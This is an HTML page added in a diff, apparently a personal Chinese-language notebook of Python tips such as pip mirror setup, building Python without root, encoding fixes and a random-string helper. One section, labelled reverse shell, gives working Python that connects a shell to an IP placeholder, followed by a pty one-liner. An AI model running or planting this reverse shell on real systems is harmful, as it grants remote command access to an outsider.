@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=80b0323c1e306cbb5dd15d883f11e06135504541">
+    <title>notebook by zjuchenyuan</title>
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <h1>notebook</h1>
+        <h2>My notebook about technology. 我的技术笔记本~</h2>
+
+        <section id="downloads">
+          
+          <a href="http://github.com/zjuchenyuan/notebook" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>#写在前面</p>
+
+<p>嗯哼，Python很好玩呢…记录一点黑科技咯</p>
+
+<p>当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py</p>
+
+<hr />
+
+<p>#设置pip源</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>mkdir -p ~/.pip
+echo """
+[global]
+index-url = http://pypi.doubanio.com/simple/
+[install]
+trusted-host=pypi.doubanio.com
+"""&gt;~/.pip/pip.conf
+</code></pre>
+</div>
+
+<p>#反弹shell</p>
+
+<p>首先自己的服务器上用<strong>nc -l 端口</strong></p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span><span class="o">,</span><span class="nn">os</span>
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span> <span class="s">"IP地址"</span> <span class="p">,</span> <span class="err">端口</span> <span class="p">))</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/bin/sh"</span><span class="p">,</span><span class="s">"-i"</span><span class="p">])</span>
+</code></pre>
+</div>
+
+<p>##获得一个tty</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>python -c 'import pty; pty.spawn("/bin/sh")'
+</code></pre>
+</div>
+
+<hr />
+
+<p>#让requests使用多个IP</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
+<span class="n">real_create_conn</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span>
+<span class="k">def</span> <span class="nf">set_src_addr</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
+    <span class="n">address</span><span class="p">,</span> <span class="n">timeout</span> <span class="o">=</span> <span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">source_address</span> <span class="o">=</span> <span class="p">(</span> <span class="err">需要使用的</span><span class="n">IP</span> <span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">real_create_conn</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">timeout</span><span class="p">,</span> <span class="n">source_address</span><span class="p">)</span>
+<span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span> <span class="o">=</span> <span class="n">set_src_addr</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+</code></pre>
+</div>
+
+<hr />
+
+<p>#Python多线程模板</p>
+
+<p><a href="code/MultiThread_Template.py">MultiThread_Template.py</a></p>
+
+<h2 id="basehttpserver">BaseHTTPServer并发性改善</h2>
+
+<blockquote>
+  <p>参考资料：<a href="http://blog.csdn.net/cnmilan/article/details/9664823">利用Python中SocketServer 实现客户端与服务器间非阻塞通信</a></p>
+</blockquote>
+
+<blockquote>
+  <p>直接修改BaseHTTPServer的代码中的一个细节，可以大幅度提高使用BaseHTTPServer能支持的并发性</p>
+</blockquote>
+
+<p>首先找到BaseHTTPServer在哪：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code> python -c "import BaseHTTPServer; print(BaseHTTPServer)"
+</code></pre>
+</div>
+
+<p>修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py</p>
+
+<p>找到这行：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>class HTTPServer(SocketServer.TCPServer):
+</code></pre>
+</div>
+
+<p>修改其继承的父类：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>class HTTPServer(SocketServer.ThreadingTCPServer):
+</code></pre>
+</div>
+
+<hr />
+
+<h2 id="rootpython">无root权限安装Python</h2>
+
+<p>下载最新版python源码后指定prefix编译，假设用户目录为/home/chenyuan</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>apt-get install libssl-dev openssl 
+curl -O https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tgz
+tar -xzf Python-3.5.2.tgz
+cd Python-3.5.2/
+./configure --prefix=/home/chenyuan/python3
+make
+make install &gt;/dev/null
+pushd /home/chenyuan/python3/bin
+cp python3 python
+cp pip3 pip
+alias python3=`pwd`/python
+alias pip3=`pwd`/pip
+</code></pre>
+</div>
+
+<hr />
+
+<h1 id="section">中文输出乱码问题</h1>
+
+<p>方法1：运行py前设置环境变量
+<code class="highlighter-rouge">
+export PYTHONIOENCODING=utf8
+</code></p>
+
+<p>方法2：强制修改stdout
+<code class="highlighter-rouge">
+import sys
+sys.stdout=open(1, 'w', encoding='utf-8', closefd=False)
+</code></p>
+
+<hr />
+
+<h1 id="pep8">遵循PEP8检查你的代码</h1>
+
+<p><a href="https://github.com/PyCQA/pycodestyle">pycodestyle</a></p>
+
+<p>安装并使用pycodestyle检查代码，忽略E501一行不能长于80个字符的限制：</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>pip install pycodestyle
+pycodestyle --show-source --ignore=E501 yourcode.py
+</code></pre>
+</div>
+
+<hr />
+
+<p>#生成随机字符串</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>from random import Random
+def random_str(randomlength=8):
+    str = ''
+    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
+    length = len(chars) - 1
+    random = Random()
+    for i in range(randomlength):
+        str+=chars[random.randint(0, length)]
+    return str
+</code></pre>
+</div>
+
+      </section>
+    </div>
+
+    
+  </body>
+</html>
